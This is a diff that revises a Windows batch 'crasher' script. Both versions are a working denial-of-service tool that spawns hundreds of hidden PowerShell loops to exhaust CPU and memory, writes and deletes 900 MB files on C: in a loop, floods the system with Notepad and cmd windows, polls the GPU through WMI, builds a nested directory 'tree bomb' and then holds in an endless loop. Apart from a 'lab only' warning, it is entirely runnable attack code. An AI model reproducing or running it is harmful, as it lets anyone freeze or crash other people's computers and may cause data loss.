@@ -1,61 +1,70 @@
 @echo off
-setlocal enabledelayedexpansion
-title 0x0806 | LAB-CRASH SUITE
+setlocal ENABLEDELAYEDEXPANSION
+title 0x0806 | 💀 Native Windows Crasher 💀
 color 0C
 
 :: CONFIG
-set CPU_THREADS=200
-set RAM_THREADS=100
-set ZOMBIE_CONSOLES=80
-set DISK_FLOODS=40
-set FILE_SIZE=1000000000
+set CPU_THREADS=250
+set RAM_THREADS=150
+set ZOMBIES=120
+set HANDLE_FLOOD=500
+set FILE_BOMBS=300
+set FILE_SIZE=900000000
+set DX_THREADS=20
 
-:: ============================
-echo [!] SYSTEM CRASH INITIATED
-echo Do NOT use this outside test lab
+echo [!!] FINAL WINDOWS STRESS/CRASH STARTING
+echo [*] DO NOT USE OUTSIDE OF LABS. THIS WILL CRASH PHYSICAL HARDWARE.
 timeout /t 5 >nul
 
-:: === CPU OVERLOAD ===
+:: ========== CPU ==========
+echo [+] CPU OVERLOAD...
 for /L %%i in (1,1,%CPU_THREADS%) do (
     start "" powershell -WindowStyle Hidden -Command "$x=1; while ($true) { $x *= 999999 }"
 )
 
-:: === RAM OVERLOAD ===
+:: ========== RAM ==========
+echo [+] RAM FLOOD...
 for /L %%i in (1,1,%RAM_THREADS%) do (
-    start "" powershell -WindowStyle Hidden -Command "$b='A'*1024*1024*500; while($true) { $b+=$b.Substring(0,10000) }"
+    start "" powershell -WindowStyle Hidden -Command "$a='A'*1024*1024*500; while($true){$a+=$a.Substring(0,10000)}"
 )
 
-:: === DISK LOCKS + NTFS JAMS ===
-for /L %%i in (1,1,%DISK_FLOODS%) do (
-    start "" cmd /c ":diskloop && fsutil file createnew C:\f%%i.tmp %FILE_SIZE% >nul && del C:\f%%i.tmp >nul && goto diskloop"
+:: ========== DISK I/O ==========
+echo [+] DISK WRITE/DELETE RACE...
+for /L %%i in (1,1,40) do (
+    start "" cmd /c ":loop && fsutil file createnew C:\crash%%i.tmp %FILE_SIZE% && del C:\crash%%i.tmp && goto loop"
 )
 
-:: === MAX ZOMBIE CMD WINDOWS ===
-for /L %%i in (1,1,%ZOMBIE_CONSOLES%) do (
-    start "" cmd /k ":zombie && echo SYSTEM CRITICAL %%i && goto zombie"
-)
-
-:: === GPU DRIVER POLLING SPAM ===
-for /L %%i in (1,1,30) do (
+:: ========== DX + GPU POLLING ==========
+echo [+] GPU WMI/DX Stack Abuse...
+for /L %%i in (1,1,%DX_THREADS%) do (
     start "" powershell -WindowStyle Hidden -Command "while ($true) { Get-WmiObject Win32_VideoController | Out-Null }"
 )
-start "" dxdiag /t %temp%\dxcrash.txt
+start "" dxdiag /t %temp%\dxbomb.txt
 
-:: === HANDLE & WINDOW OBJECT SPAM ===
-for /L %%i in (1,1,1000) do (
+:: ========== ZOMBIE CMD ==========
+echo [+] Zombie CMD windows...
+for /L %%i in (1,1,%ZOMBIES%) do (
+    start "" cmd /k ":z && echo SYSTEM HANG %%i && goto z"
+)
+
+:: ========== HANDLE/GDI LIMIT ==========
+echo [+] Window Handle Flood...
+for /L %%i in (1,1,%HANDLE_FLOOD%) do (
     start "" notepad.exe
 )
 
-:: === FILESYSTEM TREE BOMB ===
-set tpath=%temp%\treebomb
+:: ========== NTFS TREE BOMB ==========
+echo [+] Filesystem Tree Bomb...
+set tpath=%temp%\tree_bomb
 mkdir %tpath%
 cd %tpath%
-for /L %%i in (1,1,500) do (
-    mkdir folder%%i
-    cd folder%%i
+for /L %%i in (1,1,%FILE_BOMBS%) do (
+    mkdir dir%%i
+    cd dir%%i
     echo X > file%%i.txt
 )
 
-:: ENDLESS LOOP TO HOLD
-:lock
-goto lock
+:: ========== HOLD ==========
+echo [*] Letting system die... press power if locked.
+:finalloop
+goto finalloop
